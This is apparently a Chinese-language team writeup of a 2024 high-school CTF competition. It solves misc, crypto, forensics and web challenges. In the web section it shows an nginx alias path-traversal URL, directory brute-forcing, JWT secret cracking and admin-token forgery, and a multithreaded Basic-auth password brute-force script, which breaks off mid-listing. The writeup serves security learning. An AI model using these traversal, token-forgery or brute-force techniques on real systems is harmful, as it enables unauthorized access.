---
lang: zh-TW
title: "FHSH X AIS3 Club 挑戰賽 Writeup"
tags: [ "Cyber Security", "Competition", "CTF Writeup" ]
authors: [ "鄭", "salt", "XinShou" ]
type: post
showTableOfContents: true
date: 2024-06-08
---

> Team – [ntihs](https://ctfd.fhh4ck3rs.taipei/teams/16)  
> Member – cheng, salt, wasami, xinshou

{{< spoiler "Scoreboard／Challenge" >}}
![Scoreboard](https://hackmd.io/_uploads/S19f1-_rR.png)
![Challenges](https://hackmd.io/_uploads/BJJWyZuSA.png)
{{< /spoiler >}}

---

## MISC
### Welcome

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/HJe1-wlH0.png "500px")
> {{< /spoiler >}}
> 這是 Sanity Check 喔！  
> 直接複製貼上卽可！  
> 找到flag 就是CTF 的精髓啦～  
> `FhCTF{W3cOmE_ch4113nger_e8a898e5be97e58aabe585a5e8999be693ace7a4bee59c98}`  
> 簡單的啦！  
> 三類組的毛病了..都想看實體心臟...
>
> Author: CXPh03n1x

#### 題解
無

> Flag: `FhCTF{W3c0mE_ch4ll3nger_e8a898e5be97e58aa0e585a5e8999be693ace7a4bee59c98}`

---

### Survey

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/BJN8heOrC.png "500px")
> {{< /spoiler >}}
> 就是要來調查一下啦～  
> 請大家要回答喔～  
> 這題值5分  
> https://forms.gle/NzDoAgBEu2gbgN6NA
>
> Author: CXPh03n1x

#### 題解

表單填完就有了，或是偷吃步

```bash
$ curl https://docs.google.com/forms/d/e/1FAIpQLSc12s3nmeR4uoVqQrgHYCxOyO71viqTQKn9WVAdzjogM3Xhig/viewform 
| grep -E 'FhCTF{\S+}'
```

![image](https://hackmd.io/_uploads/HyCQhgdSR.png "700px")

> Flag: `FhCTF{G00d_G4m3}`

---

### INDEX 與 RULES 的差集

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/Bk_-WPeS0.png "500px")
> {{< /spoiler >}}
> みんなさん  
> 你們都熟讀首頁與規則了嗎？  
> 真的要好好熟讀喔！  
> 眞的要「熟讀」喔！！！！！
>
> Author: CXPh03n1x

#### 題解

1. 找到第一段 flag 與 xorkey
   ![image](https://hackmd.io/_uploads/Syn7-vlBC.png)
   ![image](https://hackmd.io/_uploads/rkL_-verC.png)
   `RmhDVEZ7SDNsMW8gPC0tIHBhcnQgMS8y`
   `FhCTF{H3l1o <-- part 1/2` (Base64 Decoded)

2. 找到第二段被加密過的 flag
   ![image](https://hackmd.io/_uploads/rkcfzwxB0.png)
   `192b741219293d0209041200000000000000000000030000`

3. 將 xorkey 由 ascii 轉為 hex
   `46684354467b48336c316f203c2d2d207061727420312f32`

4. 將被加密過的 flag 與 xorkey_hex 做 xor
   ![image](https://hackmd.io/_uploads/S1oW7PgSA.png)
   `5f4337465f52753165357d203c2d2d207061727420322f32`

5. 將 hex 轉回 ascii
   ![image](https://hackmd.io/_uploads/ByUG7PeSR.png)
   `_C7F_Ru1e5} <-- part 2/2`

> Flag: `FhCTF{H3l1o_C7F_Ru1e5}`

---

## CRYPTOGRAPHY
### Taiwan No.1

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/HyhFNxErA.png "500px")
> {{< /spoiler >}}
> 第一名啦！  
> 我把flag 埋在那了！  
> 去找吧！
>
> Author: Rata

#### 題解

觀察題目後發現它將每個Secret編碼成四個不同符號
猜測原始的地圖由「` `」「`\n`」「`#`」組成

先透過原始碼，將每個ascii_printable字符的編碼寫成字典
再將題目給的結果透過字典反查，便可得到結果

{{< spoiler "code" >}}

```py {linenos=inline}
import string

mapp = """

                                                                                                    
                                                                              @!                    
                                                                           $@&~^!^                  
                                                                          @%~=!%#)~@$               
                                                                   ^!^@=@$!~~%@$~##^!^@=@$!!~       
                                                              ~~&~^!^@%~-!#~^@$@&~^!^@%~^@$@-       
                                                            !#~&~^!$~##!!^#!~~~^@%~=!%#^@$@=@$      
                                                          !~@^$!~~~-!#~^@$@*~!$~@^$^!^@$~##         
                                                         $~##)@#!^@%~=!%#)@#!&~%#^@$@~!^#)          
                                                        !#~^~~$~@^$)@#!^@$@%!$$^!^@-!#~#@           
                                                      @@^@$@~@^$^!^@-!#~)!~$$@~!=~@!@~%$^           
                                                    @$@(@~~~~$$-!#~^@$@-!#~&~^!^@$@~@^$)@           
                                                 #!)~@$)@#!^@$@^!^@)~@$)@#!^@$@-!#~&~^!%!$$         
                                               )@#!^@$@)~@$^!^@^@%~(!@~&~^!%!$$^@$@@@~$&~^          
                                              !)~@$(!@~-!#~^@$@=@$!&~^!^@$@%!$$^!^@#@@@)@#          
                                             !^@$@=@$!~@^$)@#!^@$@%!$$)@#!-!#~-!#~^!^@=!            
                                           %#)@#!^@$@$~##&~^!^@%~=!%#^@$@)@#!^@%~&~^!~~%            
                                          @=!%#~@^$&!$!~!^#)!#~@!$@&~^!^@%~-~$@$~##!~~~             
                                         *~!$=@$!^@$@%!$$~~%@-!#~=@$!^@$@^@%~&~^!=@$                
                                       !^@$@&@~#)@#!^@$@-!#~)@#!)@#!^@%~^@$@=@$!~@^                 
                                      $)~@$&~^!~~%@=!%#~@^$^@$@=@$!~@^$)@#!^@$@$~#                  
                                    #)@#!^@%~-!#~)@#!-!#~^@$@&~^!-~$@^@$@(!@~)@#!-                  
                                   !#~*!~@)@#!)~@$^!^@=@$!!~~~&~^!^@%~&!$!~!^#)!#~                  
                                 ~@@~$~##$~##^@$@*!~@^!^@=@$!~@^$-!#~^@$@^!^@)~@$)                  
                                @#!^@$@-!#~)@#!)@#!^@%~^@$@=@$!~@^$)~@$&~^!~~%@=!                   
                              %#~@^$^@$@=@$!~@^$)@#!^@$@*!~@)~@$!~~~-!#~%!$$^@$@                    
                             &~^!-~$@^@$@-~$@^!^@=@$!)@#!&!$!~!^#)!#~!!@$~~%@)~@                    
     $  ^@                  $@@@~$!~~~$~##$~##-!#~^@$@^!^@)~@$)@#!^@$@^!^@$~##!                     
    ~  ~~=!%                #^@%~)@#!(!@~^@$@=@$!~@^$)~@$&~^!~~%@=!%#~@^$^@$@=@                     
                            $!~@^$)@#!^@$@&~@@&~^!$~##$!@!^@$@)~%~~@^$^!^@$~##                      
                            ^!^@&!$!~!^#)!#~(~#@)@#!^@$@-!#~~@^$^!^@$~##$~##^@                      
                           $@)~@$!~~~-!#~)@#!^@$@-~$@)~@$&~^!%!$$^@$@=@$!~@^$                       
                           )@#!^@$@^!^@-!#~~@^$)@#!-!#~&!$!=@~@$!@!^@$@~@^$)                        
                          @#!^!^@)~@$=@$!^@$@!~~~-!#~^@$@*~!$&~^!$~##(!@~)@                         
                          #!)~@$^@$@=@$!~@^$^!^@^@%~^@$@=@$!~@^$)@#!-!#~)@#                         
                          !^@$@-!#~=@$!)@#!)@#!$~##^@$@$~##!~~~%!$$&@~#-!#                          
                         ~&!$!~!^#)!#~@@#~)~@$!~~~-!#~%!$$^!^@=@$!!~~~*~!                           
                             $^@$@*~!$&~^!)~@$)@#!^@$@-~$@^!^@!~~~$~##!                             
                              ~~~^@%~=!%#&~%#^@$@(~#@)@#!^@$@)~@$)@#!                               
                              (@!#~~%@!~~~)~@$)@#!^@$@^!^@-!#~-!#~!~                                
                              ~~-!#~=@$!^!^@^@%~*~!$)@#!&!$!~!^#)!#                                 
                                ~-@%$&~^!~~%@)~@$^@$@-~$@$~##^!^@                                   
                                =!%#^@$@!~~~-!#~^@$@~@^$)@#!)               ~@                      
                                 $)@#!^!@#^@$@%!~~~@^$@!$@^                                         
                                   ~~$%!~~^~$#-!^!!~~~!!^#                                          
                                      =~@!(!@~$@$~)!~$^@%                                           
                                          ~$@$~^~~$~!#@)                                            
                                             !~$@@~$=~@!                                            
                                               ^@%~$@$~^                                            
                                                @!!&~^!&                                            
                                                ~^!(~^#(                                            
                                                ~^#&~^!&                      ~^!                   
                                                (~^#(~^                        #(!                  
                                                 @~*@^~
""".strip().replace(' ', '').replace('\n', '')


def split_by_four(s) -> list[str]:
    """將字串四個字符一組切開
    '123456789123'
    ->
    ['1234', '5678', '9123']
    """
    return [s[i:i + 4] for i in range(0, len(s), 4)]


assert len(mapp) % 4 == 0  # 四個一組，符合正確編碼格式
mapp = split_by_four(mapp)

encode = "~!@#$%^&*()-=[]\\"
SuperPower = 13 * 3 * 7 * 5

alphabet_map = {}  # 反查詢用字典
for i in string.printable:
    tmp = ''
    for prime in [13, 3, 7, 5]:  # 1 3 2 0
        for sp in range(SuperPower):
            tmp += encode[ord(i) % prime]
            break

    alphabet_map[tmp] = i

for i in mapp:  # 反查
    print(alphabet_map[i], end='')
    
    
>>>
"""
Congratulations on solving this challenge! 
The mask has1836 #'s so here are some random words to make the message long enough.
Conflict must not be seen through the lenses of desperation.
All paths are seen through the prism of fate.
Our wills are aligned through the Holy Khala.
We shall rise from the ashes.My heart is colder than these steel limbs.
Prismatic core failing! We require assistance.
Your flag is here: FhCTF{Liv3d_1n_T41w3n_Goo00oo00d}
"""
```

{{< /spoiler >}}

> Flag: `FhCTF{Liv3d_1n_T41w3n_Goo00oo00d}`


---

## FORENSICS

### MitM 攻擊者

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/ByHoVgNrC.png "500px")
> {{< /spoiler >}}
> 作為中間人的辛苦你懂嗎！！！  
> 就說了不要用不安全的協定，不要老是用不加密的協定.⋯.  
> 就是  
> 不聽！！！  
> 反正，中間人就是肝苦啦！！  
> 本題 Flag 有額外格式；fhsfctf｛\S｝
>
> Author: Adams

#### 題解

直接 grep  
![image](https://hackmd.io/_uploads/B1rAVxVrC.png)

> Flag: `fhsfctf{w1ll_a1w4y5_pr3v4il}`

---

### Hex Dumb Dumb

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/BkBGHeVS0.png "500px")
> {{< /spoiler >}}
> 我說，用 UTF-8 已經過時了！現在都用 6865786g6d616c  
> 但是總覺得..你會看不透XD
>
> Author: CXPh03n1x

#### 題解

使用`xxd`會發現怪怪的，FhC...，把首行出現的字母組合起來便是Flag
那個`＃`是底線 ．ｗ．

{{< spoiler "content" >}}

```
00040dd0: 0000 4646 4646 4646 0000 0000 0000 0000  ..FFFFFF........
00040de0: 0000 2929 2929 2929 0000 0000 0000 0000  ..))))))........
00040df0: 0000 0000 0066 0066 0000 0000 0000 0000  .....f.f........
00040e00: 0000 0000 0066 0066 0000 0000 0000 0000  .....f.f........
00040e10: 0000 0000 0066 0066 0000 0000 0000 0000  .....f.f........
00040e20: 0000 0000 0066 0066 0000 0000 0000 0000  .....f.f........
00040e30: 0000 0000 0066 0066 0000 0000 0000 0000  .....f.f........
00040e40: 0000 0000 0000 0066 0000 0000 0000 0000  .......f........
00040e50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00040e60: 0000 6868 6868 6868 0000 0000 0000 0000  ..hhhhhh........
00040e70: 0000 2929 2929 2929 0000 0000 0000 0000  ..))))))........
00040e80: 0000 0000 0048 0000 0000 0000 0000 0000  .....H..........
00040e90: 0000 0000 0048 0000 0000 0000 0000 0000  .....H..........
00040ea0: 0000 0000 0048 0000 0000 0000 0000 0000  .....H..........
00040eb0: 0000 4848 4848 0000 0000 0000 0000 0000  ..HHHH..........
00040ec0: 0000 4848 4800 0000 0000 0000 0000 0000  ..HHH...........
00040ed0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00040ee0: 0000 0000 4343 0000 0000 0000 0000 0000  ....CC..........
00040ef0: 0000 0043 2929 4300 0000 0000 0000 0000  ...C))C.........
00040f00: 0000 4329 0000 2943 0000 0000 0000 0000  ..C)..)C........
00040f10: 0000 2900 0000 0029 0000 0000 0000 0000  ..)....)........
00040f20: 0000 6300 0000 0063 0000 0000 0000 0000  ..c....c........
00040f30: 0000 6300 0000 0063 0000 0000 0000 0000  ..c....c........
00040f40: 0000 6363 0000 6363 0000 0000 0000 0000  ..cc..cc........
00040f50: 0000 0063 0000 6300 0000 0000 0000 0000  ...c..c.........
00040f60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00040f70: 0000 0000 0000 0054 0000 0000 0000 0000  .......T........
00040f80: 0000 0000 0000 0029 0000 0000 0000 0000  .......)........
00040f90: 0000 0000 0000 0074 0000 0000 0000 0000  .......t........
00040fa0: 0000 5454 5454 5474 0000 0000 0000 0000  ..TTTTTt........
```

{{< /spoiler >}}

> Flag: `FhCTF{H3xdump_n33d_m0R3_S3CUR3}`

---

### Do you know packet?

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/rk27IgNHC.png "500px")
> {{< /spoiler >}}
> I receive a PCAP file. But...., what it means?
>
> Author: Scott

#### 題解

1. 看到很多USB的封包，猜是要來解並分析內容，先過濾需要被分析的封包
   `((usb.transfer_type == 0x01) && (frame.len == 35)) && !(usb.capdata == 00:00:00:00:00:00:00:00)`
   ![image](https://hackmd.io/_uploads/BJ1wEwESC.png)

2. 將 HID Data 導出並使用腳本分析

   {{< spoiler "code">}}

```python {linenos=inline}
BOOT_KEYBOARD_MAP = {
    0x00: (None, None),  # Reserved (no event indicated)
    0x01: ('', ''),  # ErrorRollOver
    0x02: ('', ''),  # POSTFail
    0x03: ('', ''),  # ErrorUndefined
    0x04: ('a', 'A'),  # a
    0x05: ('b', 'B'),  # b
    0x06: ('c', 'C'),  # c
    0x07: ('d', 'D'),  # d
    0x08: ('e', 'E'),  # e
    0x09: ('f', 'F'),  # f
    0x0a: ('g', 'G'),  # g
    0x0b: ('h', 'H'),  # h
    0x0c: ('i', 'I'),  # i
    0x0d: ('j', 'J'),  # j
    0x0e: ('k', 'K'),  # k
    0x0f: ('l', 'L'),  # l
    0x10: ('m', 'M'),  # m
    0x11: ('n', 'N'),  # n
    0x12: ('o', 'O'),  # o
    0x13: ('p', 'P'),  # p
    0x14: ('q', 'Q'),  # q
    0x15: ('r', 'R'),  # r
    0x16: ('s', 'S'),  # s
    0x17: ('t', 'T'),  # t
    0x18: ('u', 'U'),  # u
    0x19: ('v', 'V'),  # v
    0x1a: ('w', 'W'),  # w
    0x1b: ('x', 'X'),  # x
    0x1c: ('y', 'Y'),  # y
    0x1d: ('z', 'Z'),  # z
    0x1e: ('1', '!'),  # 1
    0x1f: ('2', '@'),  # 2
    0x20: ('3', '#'),  # 3
    0x21: ('4', '$'),  # 4
    0x22: ('5', '%'),  # 5
    0x23: ('6', '^'),  # 6
    0x24: ('7', '&'),  # 7
    0x25: ('8', '*'),  # 8
    0x26: ('9', '('),  # 9
    0x27: ('0', ')'),  # 0
    0x28: ('\n', '\n'),  # Return (ENTER)
    0x29: ('[ESC]', '[ESC]'),  # Escape
    0x2a: ('\b', '\b'),  # Backspace
    0x2b: ('\t', '\t'),  # Tab
    0x2c: (' ', ' '),  # Spacebar
    0x2d: ('-', '_'),  # -
    0x2e: ('=', '+'),  # =
    0x2f: ('[', '{'),  # [
    0x30: (']', '}'),  # ]
    0x31: ('\\', '|'),  # \
    0x32: ('', ''),  # Non-US # and ~
    0x33: (';', ':'),  # ;
    0x34: ('\'', '"'),  # '
    0x35: ('`', '~'),  # `
    0x36: (',', '<'),  # ,
    0x37: ('.', '>'),  # .
    0x38: ('/', '?'),  # /
    0x39: ('[CAPSLOCK]', '[CAPSLOCK]'),  # Caps Lock
    0x3a: ('[F1]', '[F1]'),  # F1
    0x3b: ('[F2]', '[F2]'),  # F2
    0x3c: ('[F3]', '[F3]'),  # F3
    0x3d: ('[F4]', '[F4]'),  # F4
    0x3e: ('[F5]', '[F5]'),  # F5
    0x3f: ('[F6]', '[F6]'),  # F6
    0x40: ('[F7]', '[F7]'),  # F7
    0x41: ('[F8]', '[F8]'),  # F8
    0x42: ('[F9]', '[F9]'),  # F9
    0x43: ('[F10]', '[F10]'),  # F10
    0x44: ('[F11]', '[F11]'),  # F11
    0x45: ('[F12]', '[F12]'),  # F12
    0x46: ('[PRINTSCREEN]', '[PRINTSCREEN]'),  # Print Screen
    0x47: ('[SCROLLLOCK]', '[SCROLLLOCK]'),  # Scroll Lock
    0x48: ('[PAUSE]', '[PAUSE]'),  # Pause
    0x49: ('[INSERT]', '[INSERT]'),  # Insert
    0x4a: ('[HOME]', '[HOME]'),  # Home
    0x4b: ('[PAGEUP]', '[PAGEUP]'),  # Page Up
    0x4c: ('[DELETE]', '[DELETE]'),  # Delete Forward
    0x4d: ('[END]', '[END]'),  # End
    0x4e: ('[PAGEDOWN]', '[PAGEDOWN]'),  # Page Down
    0x4f: ('[RIGHTARROW]', '[RIGHTARROW]'),  # Right Arrow
    0x50: ('[LEFTARROW]', '[LEFTARROW]'),  # Left Arrow
    0x51: ('[DOWNARROW]', '[DOWNARROW]'),  # Down Arrow
    0x52: ('[UPARROW]', '[UPARROW]'),  # Up Arrow
    0x53: ('[NUMLOCK]', '[NUMLOCK]'),  # Num Lock
    0x54: ('[KEYPADSLASH]', '/'),  # Keypad /
    0x55: ('[KEYPADASTERISK]', '*'),  # Keypad *
    0x56: ('[KEYPADMINUS]', '-'),  # Keypad -
    0x57: ('[KEYPADPLUS]', '+'),  # Keypad +
    0x58: ('[KEYPADENTER]', '[KEYPADENTER]'),  # Keypad ENTER
    0x59: ('[KEYPAD1]', '1'),  # Keypad 1 and End
    0x5a: ('[KEYPAD2]', '2'),  # Keypad 2 and Down Arrow
    0x5b: ('[KEYPAD3]', '3'),  # Keypad 3 and PageDn
    0x5c: ('[KEYPAD4]', '4'),  # Keypad 4 and Left Arrow
    0x5d: ('[KEYPAD5]', '5'),  # Keypad 5
    0x5e: ('[KEYPAD6]', '6'),  # Keypad 6 and Right Arrow
    0x5f: ('[KEYPAD7]', '7'),  # Keypad 7 and Home
    0x60: ('[KEYPAD8]', '8'),  # Keypad 8 and Up Arrow
    0x61: ('[KEYPAD9]', '9'),  # Keypad 9 and Page Up
    0x62: ('[KEYPAD0]', '0'),  # Keypad 0 and Insert
    0x63: ('[KEYPADPERIOD]', '.'),  # Keypad . and Delete
    0x64: ('', ''),  # Non-US \ and |
    0x65: ('', ''),  # Application
    0x66: ('', ''),  # Power
    0x67: ('[KEYPADEQUALS]', '='),  # Keypad =
    0x68: ('[F13]', '[F13]'),  # F13
    0x69: ('[F14]', '[F14]'),  # F14
    0x6a: ('[F15]', '[F15]'),  # F15
    0x6b: ('[F16]', '[F16]'),  # F16
    0x6c: ('[F17]', '[F17]'),  # F17
    0x6d: ('[F18]', '[F18]'),  # F18
    0x6e: ('[F19]', '[F19]'),  # F19
    0x6f: ('[F20]', '[F20]'),  # F20
    0x70: ('[F21]', '[F21]'),  # F21
    0x71: ('[F22]', '[F22]'),  # F22
    0x72: ('[F23]', '[F23]'),  # F23
    0x73: ('[F24]', '[F24]'),  # F24
}


def parse_boot_keyboard_report(data: bytearray):
    # 數據解析
    modifiers = data[0]  # 修改鍵位元組
    keys = data[2:8]  # 鍵碼位元組

    # 將修改鍵位元組中的位解碼為按鍵修飾符
    ctrl = (modifiers & 0x11) != 0
    shift = (modifiers & 0x22) != 0
    alt = (modifiers & 0x44) != 0
    win = (modifiers & 0x88) != 0

    # 解析鍵碼位元組並將其映射為字元
    characters = []
    for key in keys:
        if key != 0:
            # 鍵碼不為0則查詢映射表
            if key in BOOT_KEYBOARD_MAP:
                characters.append(BOOT_KEYBOARD_MAP[key][shift])
            else:
                characters.append(None)
    return ctrl, shift, alt, win, characters


if __name__ == '__main__':
    lines = "001af8001a00f8ff,0024f9002400f9ff,0028fa002800faff,0030f9003000f9ff,0034fb003400fbff,0032fa003200faff,002efa002e00faff,002cfb002c00fbff,0023fc002300fcff,001dfb001d00fbff,0016fc001600fcff,000ffe000f00feff,0008fd000800fdff,0004fe000400feff,0000ff000000ffff,0000ff000000ffff,00ff0000ffff0000,0000ff000000ffff,0000ff000000ffff,00ffff00ffffffff,0000ff000000ffff,00ff0000ffff0000,0100000000000000,0000000000000000,0200000000000000,0200090000000000,0200000000000000,0000000000000000,00000b0000000000,0000000000000000,0200000000000000,0200060000000000,0200000000000000,0200170000000000,0200000000000000,0200090000000000,0200000000000000,02002f0000000000,0200000000000000,0000000000000000,0000040000000000,0000000000000000,0200000000000000,02002d0000000000,0200000000000000,0000000000000000,0200000000000000,0200160000000000,0200000000000000,0000000000000000,00001e0000000000,0000000000000000,0000100000000000,0000000000000000,0000130000000000,0000000000000000,00001e0000000000,0000000000000000,0000200000000000,0000000000000000,0200000000000000,02002d0000000000,0200000000000000,0200180000000000,0200000000000000,0200160000000000,0200000000000000,0200050000000000,0200000000000000,0000000000000000,0200000000000000,02002d0000000000,0200000000000000,0200060000000000,0200000000000000,0000000000000000,0200000000000000,02001f0000000000,0200000000000000,0000000000000000,0000130000000000,0000000000000000,0000240000000000,0000000000000000,0000180000000000,0000000000000000,0200000000000000,0200150000000000,0200000000000000,0000000000000000,0000080000000000,0000000000000000,0200000000000000,0200300000000000,0200000000000000,0000000000000000,00fafe00fafffeff,00effa00effffaff,00eefa00eefffaff,00eefa00eefffaff,00ecfa00ecfffaff,00edfc00edfffcff,00effc00effffcff,00f3fc00f3fffcff,00f2fa00f2fffaff,00f3fa00f3fffaff,00f1f900f1fff9ff,00f4fa00f4fffaff,00f3f900f3fff9ff,00f3fb00f3fffbff,00f4fb00f4fffbff,00f6fc00f6fffcff,00f9ff00f9ffffff,00fb0000fbff0000,00fb0000fbff0000,00fb0000fbff0000,00f60000f6ff0000,00f20000f2ff0000,00f10000f1ff0000,00edfe00edfffeff,00ecfd00ecfffdff,00ebfc00ebfffcff,00ecfc00ecfffcff,00edfb00edfffbff,00effc00effffcff,00f0fa00f0fffaff,00f2f900f2fff9ff,00f3fa00f3fffaff,00f7fc00f7fffcff,00f7fb00f7fffbff,00f9fc00f9fffcff,00fbfe00fbfffeff,00fcfe00fcfffeff,00ff0000ffff0000,00fd0000fdff0000,00fe0000feff0000,00fa0300faff0300,00f40400f4ff0400,00f20600f2ff0600,00f10800f1ff0800,00f30900f3ff0900,00f80600f8ff0600,00fa0800faff0800,00fd0100fdff0100,0000010000000100,00fdff00fdffffff,00fffe00fffffeff,00ff0000ffff0000,0002000002000000,0005000005000000,0006ff000600ffff,0006fe000600feff,000cfe000c00feff,000afc000a00fcff,000ffb000f00fbff,0011f9001100f9ff,0015f7001500f7ff,0014fa001400faff,0016f9001600f9ff,0017fb001700fbff,0015fb001500fbff,000ffc000f00fcff,0007fb000700fbff,0003f9000300f9ff,0000fb000000fbff,00fbf900fbfff9ff,00f5f700f5fff7ff,00eff900effff9ff,00ecf800ecfff8ff,00e6f800e6fff8ff,00e0f900e0fff9ff,00d6f800d6fff8ff,00d3f700d3fff7ff,00cff700cffff7ff,00cdf700cdfff7ff,00caf700cafff7ff,00c9f900c9fff9ff,00cdf700cdfff7ff,00d1f800d1fff8ff,00ddf900ddfff9ff,00e7fa00e7fffaff,00f1fa00f1fffaff,00fafa00fafffaff,00fefe00fefffeff,0000ff000000ffff,0000ff000000ffff,0001000001000000,0001000001000000,0001010001000100,0003040003000400,0004050004000500,0004050004000500,0005040005000400,0003030003000300,0004030004000300,0004030004000300,0005030005000300,0006020006000200,0008030008000300,0005010005000100,0005020005000200,0006010006000100,0007020007000200,0009010009000100,0008030008000300,0009020009000200,0007020007000200,0007030007000300,0009020009000200,0007030007000300,000c03000c000300,000a03000a000300,000c04000c000400,000d04000d000400,000a04000a000400,0007020007000200,0005010005000100,0005010005000100,0007020007000200,0005000005000000,0007010007000100,000a01000a000100,000c00000c000000,000d01000d000100,0011010011000100,0010010010000100,000e01000e000100,000c00000c000000,000a00000a000000,0001000001000000,0000020000000200,00ff0000ffff0000,00ff0000ffff0000,0000010000000100,0000010000000100,0001000001000000,0001000001000000,0001000001000000,0002010002000100,0002010002000100,0003020003000200,0002010002000100,0001010001000100,0001010001000100,0001000001000000,0001010001000100,0001000001000000,0001000001000000,0001000001000000,0001000001000000,0001010001000100,0002010002000100,0003010003000100,0002010002000100,0003020003000200,0002010002000100,0002010002000100,0001000001000000,0001000001000000,0001000001000000,0001000001000000,0001000001000000,0000020000000200,0001020001000200,0000020000000200,0001020001000200,0000030000000300,0001020001000200,0000020000000200,0000010000000100,0000030000000300,0000020000000200,0000010000000100,0000010000000100,0001000001000000,0001000001000000,0001010001000100,0100000000000000,0000000000000000".split(',')

    # 解析鍵盤數據包，獲取輸入字元
    text = ""
    for line in lines:
        data = bytearray.fromhex(line.strip())
        characters = parse_boot_keyboard_report(data)[-1]
        for character in characters:
            if character:  # may be None
                text += character

    print(f'Raw output:\n{text.__repr__()}')
    print(f'Text output:\n{text}')


>>>
"""
Raw output:
"w7\n]'= 6zsleaFhCTF{a_S1mp13_USB_C@p7uRe}aacceeffcceebcciglnrqstrldaababbababaaabcebbcdfefddfdigaiaajaagadbbdbdgijnmkig"
Text output:
w7
]'= 6zsleaFhCTF{a_S1mp13_USB_C@p7uRe}aacceeffcceebcciglnrqstrldaababbababaaabcebbcdfefddfdigaiaajaagadbbdbdgijnmkig
"""
```

{{< /spoiler >}}

> Flag: `FhCTF{a_S1mp13_USB_C@p7uRe}`


---

## WEB

### 穿越檔案的旅人

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/BJAGOPNBC.png "500px")
> {{< /spoiler >}}
> 然後就被卡車撞了...穿越異世界GOGO  
> 剛好在看穿越番...  
> 老人補充：我忘記給重要HINT了！！！flag 在 /flag.txt  
> https://travaling.fhh4ck3rs.taipei/
>
> Author: CXPh03n1x

#### 題解

觀察到這裡的nginx設定，發現只要是`/img`作為首的PATH，都會被重定向到`/images/`
他很好心的幫我們加了後面的`/`，可以利用這個漏洞進行LFI

```nginx
location /img {
    alias /images/;
}
```

URL: https://travaling.fhh4ck3rs.taipei/img../flag.txt

[圖源](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf#toolbar=0&page=19)
![image](https://hackmd.io/_uploads/ByPuKvErR.png)

> Flag: `FhCTF{how_1_tr4v3rs4l_7h3_w0rld!}`

---

### Information

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/H1-IkKVrR.png "500px")
> {{< /spoiler >}}
> 資訊是種很玄的東西，他如影隨形~  
> 所以，我們更要好好保護！  
> https://information.fhh4ck3rs.taipei/
>
> Author: CXPh03n1x

#### 題解

1. 先觀察到form的input中未定義name標籤，在POST時不會有資料被送出。由此推測此題跟登入應該沒有關聯

2. 透過`dirb`爆網頁目錄找到`/redoc`，該頁面中找到
   ![image](https://hackmd.io/_uploads/rJ5d-t4B0.png)
   打開此連結及為本題flag

> Flag: `FhCTF{Y0u_r3411y_n33d_t0_l0ck_y0ur_API_d0cum3n75}`

---

### Information Ultimate

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/ry6d4k_rR.png "500px")
> {{< /spoiler >}}
> 終極之章，你能了解我下了多少苦心嗎？  
> 總之，再來一次吧！  
> https://information-ultimate.fhh4ck3rs.taipei/
>
> Author: CXPh03n1x

#### 題解

1. 此題與上題HTML唯一的差別只在有定義name標籤，隨意填入帳號密碼，收到的回覆中包含「access-token」
   ![image](https://hackmd.io/_uploads/BkatwyOSR.png)

2. 再來一樣透過`dirb`找到`/docs`路徑可被訪問，其中的`/flag_5a6d78685a323176636d567a5a574e31636d6c3065516f3d0a`路徑可訪問到Flag
   ![image](https://hackmd.io/_uploads/S1eovyur0.png)

3. \[1.\]中的access-token可以看出是jwt，嘗試透過[腳本](https://github.com/lmammino/jwt-cracker)爆出secret

   ```bash
   $ jwt-cracker -d rockyou.txt -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhIiwiaXNBZG1pbiI6ZmFsc2V9.pZ6MHTXSRFgbLFgAjYoPYWHrmLXzlTHJ4fZT_xjY0_g
   
   SECRET FOUND: secret
   Time taken (sec): 0.128
   Total attempts: 20000
   ```

4. 生新的jwt "`isAdmin=true`"
   ![image](https://hackmd.io/_uploads/B17gi1dHA.png)

5. 帶入access-token訪問`/flag_5a6d78685a323176636d567a5a574e31636d6c3065516f3d0a`
   ![image](https://hackmd.io/_uploads/HJDrikOSA.png)

> Flag: `FhCTF{N3w_ch4ll3ng3_1n_JWT_c95ceec4ea7d5414f10853e616da8e521f957e7627368a641e46fe74720b53b1}`

---

### Information Revenge

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/SkepiJOH0.png "500px")
> {{< /spoiler >}}
> 復仇之戰，我又來啦！  
> 這次，我帶回了更安全的方式，不信你能破！！  
> 好吧，其實我也沒底，畢竟以我的名字作為認證的擔保，破解可能還是可以的...  
> 畢竟我沒那麼多時間設定好強的認證了⋯  
> https://information-revenge.fhh4ck3rs.taipei/
>
> Author: CXPh03n1x

#### 題解

1. 這題form的name標籤如同`Information`一樣未被加上，在POST時不會有資料被送出。由此推測此題跟登入應該沒有關聯
2. 老樣子一樣`dirb`找到`/docs`路徑可被訪問，但是還缺少了帳號與密碼
3. 題目敘述中的「以我的名字作為認證的擔保」猜測使用者名稱是「`CXPh03n1x`」，密碼一樣爆破
4. 寫腳本，約2:30後可得出結果，密碼為「`Password1`」

   ```python {linenos=inline}
   import base64
   import requests
   import threading
   from queue import Queue
   from tqdm import tqdm
   
   with open('rockyou.txt', 'r') as f:
       rockyou = f.readlines()
   
   password_queue = Queue()
   for password in rockyou:
       password_queue.put(password)
   
   progress = tqdm(total=len(rockyou))
   
   
   def try_password():
       while not password_queue.empty():
           password = password_queue.get()
           auth = base64.b64encode(f"CXPh03n1x:{password.strip()}".encode()).decode()
           req = requests.get(
               'https://information-revenge.fhh4ck3rs.taipei/docs',
               headers={
                   'Authorization': f'Basic {auth}',
               },
           )
   
           if req.status_code != 401:
